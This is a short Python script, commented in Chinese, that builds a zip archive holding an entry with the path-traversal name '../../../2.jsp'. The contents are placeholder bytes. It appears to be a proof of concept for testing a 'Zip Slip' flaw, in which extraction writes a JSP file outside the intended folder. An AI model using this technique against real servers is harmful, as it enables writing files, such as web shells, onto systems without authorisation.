# 制作特殊的zip包，../../../../2.jsp
import zipfile

if __name__ == "__main__":

    try:
        binary = b'222222'
        zipFile = zipfile.ZipFile("app.zip", "a", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("app.zip")
        zipFile.writestr("../../../2.jsp", binary)
        zipFile.close()
    except IOError as e:
        raise e
